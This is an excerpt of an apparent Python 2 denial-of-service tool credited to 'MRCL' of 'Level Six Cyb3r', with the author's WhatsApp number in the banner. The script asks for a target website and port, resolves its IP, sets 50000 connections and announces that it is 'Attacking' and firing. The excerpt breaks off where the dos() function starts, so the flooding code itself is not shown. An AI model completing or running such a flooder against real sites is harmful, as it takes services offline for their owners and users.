...
\033[1;92m        ::::::`:::::;' \033[1;94m /  /   `#                
\033[1;96m|#########################################|
\033[1;96m|###| Author By : MRCL   .            |###| 
\033[1;96m|###| code      : Python2             |###|
\033[1;96m|###| Team      : Level Six Cyb3r     |###|
\033[1;96m|###| Wa        : 081274975359        |###|
\033[1;96m|#########################################|
"""
print baner
def restart_program():
...
curdir = os.getcwd()
print ("\033[1;91minput web url \033[1;95m[ex : www.Blabla.com ]")
host=raw_input( "\033[1;94mMRCL@root : " )
print ("\033[1;91minput port \033[1;95m[ex : 8080 ]")
port=input("\033[1;94mMRCL@root : ")
connect=50000
ip = socket.gethostbyname( host )
print ( "\033[1;91m Attacking \033[1;93m[" + host + "]" )
print ( "\033[1;91m Attack to ip \033[1;93m["+ ip + "]" )
message=("ATTACK Of LEVEL SIX CYB3R...")
print ("\033[1;91mFIRE..............................")
def dos():
    #pid = os.fork()
